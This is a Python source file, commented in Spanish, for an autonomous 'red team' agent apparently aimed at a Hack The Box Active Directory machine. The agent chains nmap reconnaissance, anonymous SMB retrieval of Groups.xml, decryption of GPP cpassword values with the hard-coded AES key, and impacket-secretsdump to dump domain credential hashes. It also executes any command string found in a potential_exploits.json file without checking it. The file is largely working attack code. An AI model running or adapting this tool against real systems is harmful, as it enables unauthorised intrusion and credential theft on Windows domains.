import sys
import json
import time
import re
import logging
import base64
from pathlib import Path
from Crypto.Cipher import AES

# Configuración de logs obligatorios en pantalla
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("EnterpriseDynamicAgent")

from core.state_manager import StateManager
from utils.smart_executor import SmartCommandExecutor
from utils.exploit_matcher import ExploitMatcher

class EnterpriseDynamicAgent:
    def __init__(self, target_ip: str, domain_name: str = None):
        self.target_ip = target_ip
        self.domain_name = domain_name
        
        self.state_manager = StateManager(target_ip)
        previous_state = self.state_manager.load_state()
        self.current_step = previous_state.get("step_count", 0) + 1
        
        logger.info(f"[*] [Agente Dinámico] Reanudando sesión para {target_ip}. Paso actual: {self.current_step}")
        
        self.executor = SmartCommandExecutor(timeout_minutes=20, poll_interval=15)
        self.exploit_matcher = ExploitMatcher(target_ip)

    def extract_domain_from_scan(self, scan_content: str):
        if self.domain_name:
            return  
        match = re.search(r"Domain:\s*([a-zA-Z0-9.-]+\.[a-zA-Z]+)", scan_content, re.IGNORECASE)
        if match:
            self.domain_name = match.group(1).lower()
            self.state_manager.update_etc_hosts(domain_name=self.domain_name)
        else:
            self.domain_name = "active.htb"

    def decrypt_gpp_password(self, cpassword: str) -> str:
        try:
            padding = '=' * (4 - (len(cpassword) % 4))
            decoded = base64.b64decode(cpassword + padding)
            key = b"\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8"\
                  b"\xf4\x96\xae\x0a\x3d\x7e\x1c\xf7\xfe\xee\x1f\xd3\xfa\x06\x30\x7c"
            iv = b"\x00" * 16
            cipher = AES.new(key, AES.MODE_CBC, iv)
            decrypted = cipher.decrypt(decoded)
            padding_len = decrypted[-1]
            return decrypted[:-padding_len].decode('utf-16le', errors='ignore')
        except Exception as e:
            return None

    def parse_loot_for_credentials(self) -> dict:
        loot_dir = Path(f"testing/{self.target_ip}/loot")
        creds = {"username": None, "password": None}
        if not loot_dir.exists():
            return creds

        for xml_file in loot_dir.glob("**/*.xml"):
            try:
                content = xml_file.read_text(encoding="utf-8", errors="ignore")
                user_match = re.search(r'userName="([^"]+)"', content, re.IGNORECASE)
                pass_match = re.search(r'cpassword="([^"]+)"', content, re.IGNORECASE)
                
                if user_match:
                    creds["username"] = user_match.group(1)
                if pass_match:
                    cpass = pass_match.group(1)
                    plain = self.decrypt_gpp_password(cpass)
                    if plain:
                        creds["password"] = plain
                        logger.info(f"[+] [GPP Decryptor] ¡Credenciales halladas! Usuario: {creds['username']} | Pass: {plain}")
            except Exception as e:
                continue
        return creds

    def determine_next_action(self, current_state: dict) -> tuple:
        history = current_state.get("history", [])
        executed_commands = [h.get("command", "") for h in history]

        # 0. PRIORIDAD ABSOLUTA: Lector de potential_exploits.json a prueba de balas
        exploit_file_paths = [
            Path(f"testing/{self.target_ip}/potential_exploits.json"),
            Path("potential_exploits.json")
        ]
        
        json_found = False
        for path in exploit_file_paths:
            if path.exists():
                json_found = True
                try:
                    content = path.read_text(encoding="utf-8", errors="ignore")
                    exploits_data = json.loads(content)
                    
                    # Extraer los items sin importar cómo esté estructurado el JSON
                    exploits_list = []
                    if isinstance(exploits_data, dict):
                        # Buscar en las llaves más comunes
                        for key in ["exploits", "vulnerabilities", "comandos", "commands"]:
                            if key in exploits_data:
                                exploits_list.extend(exploits_data[key])
                        # Si sigue vacía, tomar todos los valores del diccionario
                        if not exploits_list:
                            exploits_list = list(exploits_data.values())
                    elif isinstance(exploits_data, list):
                        exploits_list = exploits_data
                        
                    for exp in exploits_list:
                        cmd = None
                        if isinstance(exp, dict):
                            cmd = exp.get("command") or exp.get("exec") or exp.get("exploit") or exp.get("payload")
                        elif isinstance(exp, str):
                            cmd = exp
                            
                        # Ejecutar si existe y no está en el historial
                        if cmd and cmd not in executed_commands:
                            logger.info(f"[!] [JSON Parser] Ejecutando vulnerabilidad de {path}")
                            return cmd, "exploitation"
                except Exception as e:
                    logger.error(f"[-] Error crítico parseando {path}: {e}")

        if not json_found:
            logger.warning(f"[-] ATENCIÓN: No se detectó 'potential_exploits.json' en la raíz ni en testing/{self.target_ip}/")

        # 1. Reconocimiento Nmap
        scan_path = f"testing/{self.target_ip}/scans/version_scan.txt"
        if not Path(scan_path).exists():
            return f"nmap -sV -sC -p 53,88,135,139,389,445,464,593,636,3268,3269 -oN {scan_path} {self.target_ip}", "recon"

        if Path(scan_path).exists():
            with open(scan_path, "r", encoding="utf-8") as f:
                scan_content = f.read()
            self.extract_domain_from_scan(scan_content)

        domain = self.domain_name or "active.htb"
        loot_dir = Path(f"testing/{self.target_ip}/loot")
        loot_dir.mkdir(parents=True, exist_ok=True)

        # 2. SMB Replication
        xml_files = list(loot_dir.glob("**/*.xml"))
        smb_attempted = any("Replication" in cmd for cmd in executed_commands)
        
        if not xml_files and not smb_attempted:
            repl_cmd = f"smbclient -U '%' -N //{self.target_ip}/Replication -c 'recurse ON; prompt OFF; lcd {loot_dir}; mget *Groups.xml'"
            return repl_cmd, "exploitation"

        # 3. Extraer credenciales y Secretsdump
        creds = self.parse_loot_for_credentials()
        if creds["username"] and creds["password"]:
            user = creds["username"]
            pwd = creds["password"]
            
            dump_cmd = f"impacket-secretsdump {domain}/{user}:{pwd}@{self.target_ip}"
            if not any("secretsdump" in cmd for cmd in executed_commands):
                return dump_cmd, "post-exploitation"

        # 4. Finalizar operación de forma limpia
        return f"echo '[*] Auditoría completada. No se encontraron más vectores de ataque.'", "complete"

    def run_autonomous_loop(self):
        logger.info("==================================================")
        logger.info(f"[*] [Iniciando Agente Autónomo Red Team] Objetivo: {self.target_ip}")
        logger.info("==================================================")

        while True:
            logger.info(f"\n==================================================")
            logger.info(f"[*] [Agente Autónomo - Paso Global #{self.current_step}] Evaluando entorno...")
            logger.info(f"==================================================")

            current_state = self.state_manager.load_state()
            command, phase = self.determine_next_action(current_state)

            if "echo" in command and "completada" in command:
                logger.info(f"[*] {command}")
                break

            logger.info(f"[*] [Motor Decisión] Ejecutando: {command}")
            exec_result = self.executor.execute_with_polling(command)
            output = exec_result.get("stdout", "")

            history_entry = {
                "step": self.current_step,
                "command": command,
                "output": output
            }
            
            self.state_manager.save_state(
                step=self.current_step,
                history_entry=history_entry,
                phase=phase,
                mission_complete=False
            )

            self.current_step += 1
            time.sleep(3)

        logger.info("[+] [Agente] Operación finalizada.")

if __name__ == "__main__":
    TARGET_IP = sys.argv[1] if len(sys.argv) > 1 else "10.129.9.175"
    agent = EnterpriseDynamicAgent(target_ip=TARGET_IP)
    agent.run_autonomous_loop()